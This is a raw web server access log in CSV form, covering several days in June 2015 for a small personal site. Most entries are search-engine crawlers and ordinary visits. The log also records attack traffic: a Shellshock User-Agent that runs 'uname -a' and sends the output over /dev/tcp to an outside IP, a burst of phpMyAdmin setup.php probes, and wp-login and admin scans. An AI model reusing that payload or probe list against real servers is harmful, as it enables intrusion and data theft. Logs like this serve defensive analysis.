"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"106.120.173.111","-","2015-06-23 13:37:35","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"106.120.173.111","-","2015-06-23 13:37:40","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"207.46.13.18","-","2015-06-23 15:35:00","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"111.13.102.138","-","2015-06-23 16:19:22","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"62.75.216.19","-","2015-06-23 16:29:23","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
"67.53.77.196","-","2015-06-23 17:41:59","GMT-0700","GET","/micro/index.html",404,470,"-","Scrapy/0.16.5 (+http://scrapy.org)"
"201.207.236.238","-","2015-06-23 18:46:56","GMT-0700","GET","/tmUnblock.cgi",400,514,"-","-"
"201.207.236.238","-","2015-06-23 18:46:57","GMT-0700","GET","/",400,514,"-","-"
"208.93.104.8","-","2015-06-23 22:23:22","GMT-0700","GET","/sitemap.xml",404,504,"-","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0"
"208.93.104.8","-","2015-06-23 22:23:23","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0"
"203.133.169.145","-","2015-06-23 22:25:15","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0 (Following Mediapartners-Google)"
"203.133.169.207","-","2015-06-23 22:31:16","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0 (Following Mediapartners-Google)"
"66.249.79.184","-","2015-06-23 22:35:45","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"203.133.169.145","-","2015-06-23 23:35:03","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0 (Following Mediapartners-Google)"
"104.194.17.122","-","2015-06-23 23:53:58","GMT-0700","GET","/ramble/index.php?blogId=9",404,507,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
"207.46.13.6","-","2015-06-24 00:00:20","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"104.192.0.21","-","2015-06-24 02:43:34","GMT-0700","GET","/",200,562,"-","(){ :; };uname -a > /dev/tcp/104.192.0.21/53"
"69.164.111.198","-","2015-06-24 04:10:16","GMT-0700","GET","/",200,600,"-","Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MDDC)"
"46.229.164.113","-","2015-06-24 04:12:35","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
"54.144.20.248","-","2015-06-24 04:42:52","GMT-0700","HEAD","/",200,260,"-","Cloud mapping experiment. Contact research@pdrlabs.net"
"106.120.173.111","-","2015-06-24 05:09:09","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"52.6.199.119","-","2015-06-24 05:31:14","GMT-0700","GET","/",200,562,"-","Python-urllib/3.4"
"46.229.164.99","-","2015-06-24 05:52:55","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
"104.197.16.186","-","2015-06-24 06:56:44","GMT-0700","GET","/",200,600,"-","NerdyBot"
"178.255.215.92","-","2015-06-24 07:22:28","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"185.62.190.177","-","2015-06-24 07:43:17","GMT-0700","GET","/muieblackcat",404,470,"-","-"
"185.62.190.177","-","2015-06-24 07:43:17","GMT-0700","GET","//phpMyAdmin/scripts/setup.php",404,480,"-","-"
"185.62.190.177","-","2015-06-24 07:43:18","GMT-0700","GET","//phpmyadmin/scripts/setup.php",404,480,"-","-"
"185.62.190.177","-","2015-06-24 07:43:18","GMT-0700","GET","//pma/scripts/setup.php",404,475,"-","-"
"185.62.190.177","-","2015-06-24 07:43:18","GMT-0700","GET","//myadmin/scripts/setup.php",404,478,"-","-"
"185.62.190.177","-","2015-06-24 07:43:19","GMT-0700","GET","//MyAdmin/scripts/setup.php",404,479,"-","-"
"185.62.190.177","-","2015-06-24 07:43:19","GMT-0700","GET","//scripts/setup.php",404,472,"-","-"
"185.62.190.177","-","2015-06-24 07:43:20","GMT-0700","GET","//admin/scripts/setup.php",404,477,"-","-"
"185.62.190.177","-","2015-06-24 07:43:20","GMT-0700","GET","//admin/pma/scripts/setup.php",404,479,"-","-"
"185.62.190.177","-","2015-06-24 07:43:20","GMT-0700","GET","//admin/phpmyadmin/scripts/setup.php",404,482,"-","-"
"185.62.190.177","-","2015-06-24 07:43:21","GMT-0700","GET","//db/scripts/setup.php",404,474,"-","-"
"185.62.190.177","-","2015-06-24 07:43:21","GMT-0700","GET","//dbadmin/scripts/setup.php",404,478,"-","-"
"185.62.190.177","-","2015-06-24 07:43:22","GMT-0700","GET","//myadmin/scripts/setup.php",404,478,"-","-"
"185.62.190.177","-","2015-06-24 07:43:22","GMT-0700","GET","//mysql/scripts/setup.php",404,477,"-","-"
"185.62.190.177","-","2015-06-24 07:43:22","GMT-0700","GET","//mysqladmin/scripts/setup.php",404,481,"-","-"
"185.62.190.177","-","2015-06-24 07:43:23","GMT-0700","GET","//phpadmin/scripts/setup.php",404,478,"-","-"
"185.62.190.177","-","2015-06-24 07:43:23","GMT-0700","GET","//pma/scripts/setup.php",404,475,"-","-"
"185.62.190.177","-","2015-06-24 07:43:23","GMT-0700","GET","//web/scripts/setup.php",404,475,"-","-"
"185.62.190.177","-","2015-06-24 07:43:24","GMT-0700","GET","//websql/scripts/setup.php",404,477,"-","-"
"185.62.190.177","-","2015-06-24 07:43:24","GMT-0700","GET","//blog/phpmyadmin/scripts/setup.php",404,483,"-","-"
"185.62.190.177","-","2015-06-24 07:43:25","GMT-0700","GET","//forum/phpmyadmin/scripts/setup.php",404,484,"-","-"
"185.62.190.177","-","2015-06-24 07:43:25","GMT-0700","GET","//php/phpmyadmin/scripts/setup.php",404,481,"-","-"
"185.62.190.177","-","2015-06-24 07:43:25","GMT-0700","GET","//phpmyadmin/scripts/setup.php",404,480,"-","-"
"127.0.0.1","-","2015-06-24 07:43:26","GMT-0700","OPTIONS","*",200,152,"-","Apache/2.2.16 (Ubuntu) (internal dummy connection)"
"104.197.92.18","-","2015-06-24 08:14:49","GMT-0700","GET","/",200,600,"-","NerdyBot"
"119.63.196.114","-","2015-06-24 08:52:19","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"66.249.79.95","-","2015-06-24 09:22:55","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"66.249.79.78","-","2015-06-24 09:58:10","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"46.229.164.114","-","2015-06-24 12:50:50","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; SemrushBot/0.98~bl; +http://www.semrush.com/bot.html)"
"123.30.175.207","-","2015-06-24 14:06:56","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"50.182.5.128","-","2015-06-24 14:41:04","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.50.2 (KHTML, like Gecko) Version/5.0.6 Safari/533.22.3"
"50.182.5.128","-","2015-06-24 14:41:04","GMT-0700","GET","/hamster.gif",200,700105,"http://spinster.org/","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.50.2 (KHTML, like Gecko) Version/5.0.6 Safari/533.22.3"
"103.241.146.171","-","2015-06-24 18:05:31","GMT-0700","HEAD","/",200,279,"-","-"
"95.215.9.222","-","2015-06-24 18:26:23","GMT-0700","GET","/",200,562,"-","netscan.lekus.su"
"106.120.173.111","-","2015-06-24 21:23:15","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"106.120.173.111","-","2015-06-24 21:23:24","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"180.76.15.15","-","2015-06-24 21:48:32","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
"66.249.79.116","-","2015-06-24 21:58:38","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"54.161.70.33","-","2015-06-24 22:16:30","GMT-0700","GET","/",200,600,"-","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31"
"178.255.215.92","-","2015-06-24 22:41:41","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"70.166.80.118","-","2015-06-24 22:56:44","GMT-0700","GET","/",200,600,"-","-"
"208.93.104.9","-","2015-06-24 23:02:08","GMT-0700","HEAD","/",200,260,"-","http://www.yellowpages.com/about/legal/crawl"
"54.81.20.95","-","2015-06-25 02:32:06","GMT-0700","GET","/robots.txt",200,385,"-","InsideView/Nutch-1.5.1"
"112.64.235.87","-","2015-06-25 03:01:43","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.0 QQ-Manager Mobile Safari/537.36"
"104.236.172.195","-","2015-06-25 05:06:42","GMT-0700","GET","/",200,527,"-","CRAZYWEBCRAWLER 0.9.4, http://www.crazywebcrawler.com"
"69.142.213.13","-","2015-06-25 07:08:43","GMT-0700","GET","/",200,565,"http://www.yellowpages.com/nj/milwaukee-electric-tool-service-center","Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"
"69.142.213.13","-","2015-06-25 07:08:43","GMT-0700","GET","/hamster.gif",200,700105,"http://spinster.org/","Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"
"84.95.88.100","-","2015-06-25 07:34:55","GMT-0700","GET","/ramble/index.php?blogId=10",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"84.95.88.100","-","2015-06-25 07:37:27","GMT-0700","GET","/ramble/index.php?blogId=11",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"84.95.88.100","-","2015-06-25 07:37:51","GMT-0700","GET","/ramble/index.php?blogId=13",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"84.95.88.100","-","2015-06-25 07:42:51","GMT-0700","GET","/ramble/index.php?blogId=21",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"84.95.88.100","-","2015-06-25 08:02:50","GMT-0700","GET","/ramble/index.php?blogId=44",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"84.95.88.100","-","2015-06-25 08:14:08","GMT-0700","GET","/ramble/index.php?blogId=63",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"84.95.88.100","-","2015-06-25 08:15:45","GMT-0700","GET","/ramble/index.php?blogId=64",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"84.95.88.100","-","2015-06-25 08:32:47","GMT-0700","GET","/ramble/index.php?blogId=85",404,495,"-","S3E/ANDROID/SCH-I405/4.34.0"
"119.63.196.107","-","2015-06-25 08:51:59","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"207.46.13.83","-","2015-06-25 08:58:21","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"66.249.79.184","-","2015-06-25 09:41:13","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"199.58.86.211","-","2015-06-25 10:46:28","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"157.82.156.133","-","2015-06-25 11:37:37","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Steeler/3.5; http://www.tkl.iis.u-tokyo.ac.jp/~crawler/)"
"104.255.65.11","-","2015-06-25 12:15:36","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"172.245.71.124","-","2015-06-25 12:22:52","GMT-0700","GET","/ramble/index.php?blogId=39",404,469,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 AlexaToolbar/alxf-2.21"
"172.245.71.124","-","2015-06-25 12:22:53","GMT-0700","GET","/",200,565,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 AlexaToolbar/alxf-2.21"
"104.128.138.225","-","2015-06-25 13:19:48","GMT-0700","GET","/ramble/index.php?blogId=4",404,450,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
"104.128.138.225","-","2015-06-25 13:19:48","GMT-0700","GET","/",200,508,"http://spinster.org","Mozilla/5.0 (Windows NT 6.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
"66.249.79.95","-","2015-06-25 13:25:27","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"67.53.77.196","-","2015-06-25 13:37:36","GMT-0700","GET","/",200,527,"-","Scrapy/0.16.5 (+http://scrapy.org)"
"191.237.13.246","-","2015-06-25 15:41:39","GMT-0700","GET","/ramble/index.php?blogId=54",404,533,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.42 Safari/537.36"
"191.237.13.246","-","2015-06-25 15:41:43","GMT-0700","GET","/ramble/index.php?blogId=54",404,476,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.42 Safari/537.36"
"191.237.13.246","-","2015-06-25 15:41:47","GMT-0700","GET","/ramble/index.php?blogId=54",404,476,"-","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.42 Safari/537.36"
"120.88.41.73","-","2015-06-25 16:39:15","GMT-0700","GET","/album/2001/6-june-24/justin_bruise.jpg",404,529,"-","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E; MSOffice 12)"
"106.120.173.111","-","2015-06-25 16:47:35","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"208.107.41.62","-","2015-06-25 17:21:40","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"46.165.197.141","-","2015-06-25 18:49:40","GMT-0700","GET","/robots.txt",200,358,"-","Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"207.46.13.18","-","2015-06-25 19:31:45","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"49.238.34.247","-","2015-06-25 20:01:35","GMT-0700","GET","/",200,565,"-","Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.1.2576 Mobile Safari/537.35+"
"49.238.34.247","-","2015-06-25 20:01:36","GMT-0700","GET","/hamster.gif",200,700105,"http://spinster.org/","Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.1.2576 Mobile Safari/537.35+"
"49.238.34.247","-","2015-06-25 20:01:44","GMT-0700","GET","/favicon.ico",404,503,"http://spinster.org/","Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.1.2576 Mobile Safari/537.35+"
"213.230.74.226","-","2015-06-25 21:19:32","GMT-0700","POST","/default.php",404,508,"http://digitalflock.org/default.php","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
"123.30.175.207","-","2015-06-25 22:16:43","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
"66.249.79.78","-","2015-06-26 00:14:35","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"178.255.215.92","-","2015-06-26 00:50:05","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"178.255.215.92","-","2015-06-26 01:17:28","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"157.55.39.6","-","2015-06-26 03:00:48","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"208.115.113.82","-","2015-06-26 03:48:57","GMT-0700","GET","/robots.txt",200,365,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"208.115.113.82","-","2015-06-26 03:57:23","GMT-0700","GET","/ramble/index.php?blogId=92",404,476,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"50.251.42.125","-","2015-06-26 06:45:26","GMT-0700","GET","/",200,565,"http://www.pressofatlanticcity.com/findit/atlantic-tool-supply/business_37763488.html","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
"50.251.42.125","-","2015-06-26 06:45:26","GMT-0700","GET","/hamster.gif",200,700105,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
"50.251.42.125","-","2015-06-26 06:45:29","GMT-0700","GET","/favicon.ico",404,503,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
"108.59.81.163","-","2015-06-26 06:55:01","GMT-0700","GET","/",200,600,"-","NerdyBot"
"195.62.52.116","-","2015-06-26 07:06:45","GMT-0700","GET","/wp-login.php",404,505,"-","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
"195.62.52.116","-","2015-06-26 07:06:46","GMT-0700","GET","/administrator/",404,504,"-","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
"195.62.52.116","-","2015-06-26 07:06:46","GMT-0700","GET","/admin.php",404,501,"-","Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
"141.212.122.194","-","2015-06-26 07:43:20","GMT-0700","GET","/",200,543,"-","-"
"208.115.113.82","-","2015-06-26 07:57:19","GMT-0700","GET","/robots.txt",200,365,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"104.197.95.100","-","2015-06-26 08:13:42","GMT-0700","GET","/",200,600,"-","NerdyBot"
"178.255.215.92","-","2015-06-26 08:20:35","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"66.249.64.153","-","2015-06-26 08:33:54","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"167.114.156.198","-","2015-06-26 08:42:06","GMT-0700","GET","/album/2005/rms-0923/54.html",404,487,"-","Domain Re-Animator Bot (http://domainreanimator.com) - support@domainreanimator.com"
"208.115.113.82","-","2015-06-26 08:46:36","GMT-0700","GET","/ramble/index.php?blogId=96",404,476,"-","Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
"119.63.196.19","-","2015-06-26 08:52:24","GMT-0700","GET","/",200,562,"-","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"157.55.39.196","-","2015-06-26 10:01:06","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"192.99.33.150","-","2015-06-26 10:03:38","GMT-0700","GET","/ramble/index.php?blogId=15",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.2; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
"192.99.33.150","-","2015-06-26 10:03:38","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.2; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
"67.53.77.196","-","2015-06-26 12:13:38","GMT-0700","GET","/micro/",404,466,"-","Scrapy/0.16.5 (+http://scrapy.org)"
"46.161.2.136","-","2015-06-26 12:36:57","GMT-0700","GET","/",200,508,"-","Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
"157.55.39.229","-","2015-06-26 12:54:57","GMT-0700","GET","/robots.txt",200,396,"-","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"104.193.9.236","-","2015-06-26 13:15:48","GMT-0700","GET","/phpmyadmin/scripts/setup.php",404,512,"-","-"
"106.120.173.111","-","2015-06-26 13:21:36","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"106.120.173.111","-","2015-06-26 13:21:41","GMT-0700","GET","/robots.txt",200,358,"-","Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
"5.102.173.71","-","2015-06-26 16:59:23","GMT-0700","GET","/robots.txt",200,366,"-","Mozilla/5.0 (compatible; MojeekBot/0.6; +https://www.mojeek.com/bot.html)"
"50.242.80.177","-","2015-06-26 16:59:39","GMT-0700","GET","/phone_pix/cat.jpg",404,534,"-","Wget/1.12 (linux-gnu)"
"173.242.82.103","-","2015-06-26 17:57:47","GMT-0700","GET","/",200,565,"-","Links (2.7; Linux 3.18.11-v7+ armv7l; GNU C 4.6.3; text)"
"192.99.107.156","-","2015-06-26 20:11:33","GMT-0700","GET","/robots.txt",200,366,"-","Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)"
"66.249.64.236","-","2015-06-26 21:13:40","GMT-0700","GET","/robots.txt",200,423,"-","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"141.212.122.154","-","2015-06-26 21:31:07","GMT-0700","CONNECT","google.com:443",405,535,"-","-"
"195.5.21.216","-","2015-06-26 21:39:18","GMT-0700","GET","/",200,508,"-","Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
"178.168.111.21","-","2015-06-26 21:42:38","GMT-0700","GET","/robots.txt",200,366,"-","izsearch.com"
"81.144.138.34","-","2015-06-26 22:49:44","GMT-0700","GET","/robots.txt",200,385,"-","Wotbox/2.01 (+http://www.wotbox.com/bot/)"
"67.53.77.196","-","2015-06-26 23:05:27","GMT-0700","GET","/",200,527,"-","Scrapy/0.16.5 (+http://scrapy.org)"
"95.215.9.222","-","2015-06-26 23:10:19","GMT-0700","GET","/",200,562,"-","netscan.lekus.su"
"5.254.97.68","-","2015-06-27 00:12:29","GMT-0700","GET","/ramble/index.php?blogId=5",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
"5.254.97.68","-","2015-06-27 00:12:29","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
"93.170.186.121","-","2015-06-27 01:04:53","GMT-0700","GET","/",200,543,"http://boleznikogi.com/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)"
"93.170.186.121","-","2015-06-27 01:04:54","GMT-0700","GET","/",200,543,"http://boleznikogi.com/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)"
"93.170.186.121","-","2015-06-27 01:04:55","GMT-0700","GET","/",200,543,"http://boleznikogi.com/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)"
"178.255.215.92","-","2015-06-27 01:57:32","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"23.229.30.164","-","2015-06-27 02:22:17","GMT-0700","GET","/ramble/index.php?blogId=64",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
"23.229.30.164","-","2015-06-27 02:22:17","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
"46.108.39.199","-","2015-06-27 02:24:57","GMT-0700","GET","/ramble/index.php?blogId=5",404,507,"http://spinster.org/","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
"46.108.39.199","-","2015-06-27 02:24:58","GMT-0700","GET","/",200,564,"http://spinster.org","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
"123.30.175.213","-","2015-06-27 02:30:33","GMT-0700","GET","/robots.txt",200,385,"-","Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
